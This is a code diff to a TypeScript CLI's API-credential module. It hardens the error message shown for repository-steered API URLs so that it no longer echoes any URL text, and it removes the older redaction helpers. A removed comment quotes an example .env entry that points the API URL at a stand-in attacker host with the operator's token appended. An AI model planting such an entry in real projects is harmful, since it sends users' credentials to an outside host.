@@ -21,7 +21,6 @@ import {
   resolveCliApiUrl,
   resolveCliApiUrlWithOrigin,
 } from "./constants.ts";
-import { sanitizeUrlCredentials } from "veryfront/utils";
 import { readProjectLinkForControlPlane } from "./project-link.ts";
 import { isConnectionRefusedError, isRetryableConnectionError } from "../../src/proxy/retry.ts";
 
@@ -295,74 +294,25 @@ export function isUntrustedApiUrlCredentialError(error: unknown): boolean {
     (error instanceof Error && error.name === "UntrustedApiUrlCredentialError");
 }
 
-/** Below this length a "secret" would match too much ordinary text to redact. */
-const MIN_REDACTABLE_SECRET_LENGTH = 8;
-
-/**
- * Reduce a repository-supplied URL to the part worth showing the developer.
- *
- * The origin keeps the protocol and host that identify the redirect and drops
- * userinfo, path, query, and fragment, which is where an expanded credential
- * lands.
- */
-function toDisplayApiUrl(apiUrl: string): string {
-  try {
-    const { origin } = new URL(apiUrl);
-    if (origin !== "null") return origin;
-  } catch {
-    // Fall through: an unparseable URL still gets userinfo stripped below.
-  }
-  return sanitizeUrlCredentials(apiUrl);
-}
-
-/** Replace any ambient credential still visible in `text` with a placeholder. */
-function redactAmbientSecrets(text: string, secrets: readonly string[]): string {
-  let redacted = text;
-  for (const secret of secrets) {
-    if (secret.length < MIN_REDACTABLE_SECRET_LENGTH) continue;
-    redacted = redacted.split(secret).join("<REDACTED>");
-  }
-  return redacted;
-}
-
-/** Every ambient credential that must never be echoed back to the developer. */
-async function collectAmbientSecrets(env: EnvironmentConfig): Promise<string[]> {
-  const secrets: string[] = [];
-  if (env.apiToken) secrets.push(env.apiToken);
-  const storedToken = await readToken(env);
-  if (storedToken) secrets.push(storedToken);
-  return secrets;
-}
-
 /**
  * Explain the refusal to the developer running the command.
  *
- * The URL is repository content, so only its origin is shown and userinfo is
- * stripped before it reaches terminal output, `--json` payloads, or CI logs.
- * A project `.env` value is variable-expanded as it loads, so an entry such as
- * `VERYFRONT_API_URL=https://attacker.example/$VERYFRONT_API_TOKEN` carries the
- * operator's real shell token into the URL. Any ambient credential still
- * visible after that reduction is replaced with `<REDACTED>`. Only the env
- * file's name is shown, never its path on this machine.
- *
- * Because the shown URL is the origin alone, it is never offered as a value to
- * copy into `VERYFRONT_API_URL`: a self-hosted endpoint such as
- * `https://control.example/api` needs its base path, and assigning the bare
- * origin would send every request to the wrong path. The message names the
- * variable and leaves the exact endpoint to the developer, who knows it.
+ * Repository-controlled URL text is never echoed. Project `.env` values can
+ * expand any process variable, including credentials the resolver does not
+ * know about, and an expanded secret can land in any URL component or in an
+ * unparseable value. Only the env file's name is shown, never its path.
  */
-function describeUntrustedApiUrl(trust: ApiUrlTrust, ambientSecrets: readonly string[]): string {
-  const safeApiUrl = redactAmbientSecrets(toDisplayApiUrl(trust.apiUrl), ambientSecrets);
+function describeUntrustedApiUrl(trust: ApiUrlTrust): string {
   const steer = trust.steeringEnvFile === undefined
-    ? `veryfront.json sets apiUrl to ${safeApiUrl}`
+    ? "veryfront.json selects a repository-configured API endpoint"
     : `The project ${
       basename(trust.steeringEnvFile)
-    } file sets ${trust.steeringEnvKey} to ${safeApiUrl}`;
+    } file sets ${trust.steeringEnvKey} to a repository-configured API endpoint`;
 
   return `${steer}. Veryfront does not send credentials from your shell environment or ` +
-    `'veryfront login' to that host. Add a matching apiToken to veryfront.json, or, if you ` +
-    `trust ${safeApiUrl}, set VERYFRONT_API_URL in your shell to that API endpoint, including ` +
-    `any base path it needs, to confirm this API host.`;
+    `'veryfront login' to that endpoint. Add a matching apiToken to veryfront.json, or, if ` +
+    `you trust the configured endpoint, set VERYFRONT_API_URL in your shell to the complete ` +
+    `API endpoint to confirm it.`;
 }
 
 /**
@@ -523,7 +473,7 @@ export async function assertApiUrlAcceptsNewCredential(
   if (!trust.repositorySteered || trust.steeringEnvFile === undefined) return;
 
   throw new UntrustedApiUrlCredentialError(
-    describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
+    describeUntrustedApiUrl(trust),
   );
 }
 
@@ -575,7 +525,7 @@ export async function resolveApiCredentialForFallback(
   const [candidate] = eligible;
   if (!candidate && trust.repositorySteered) {
     throw new UntrustedApiUrlCredentialError(
-      describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
+      describeUntrustedApiUrl(trust),
     );
   }
 
@@ -603,7 +553,7 @@ async function resolveConfigBase(
 
   if (!apiToken && trust.repositorySteered) {
     throw new UntrustedApiUrlCredentialError(
-      describeUntrustedApiUrl(trust, await collectAmbientSecrets(env)),
+      describeUntrustedApiUrl(trust),
     );
   }
 
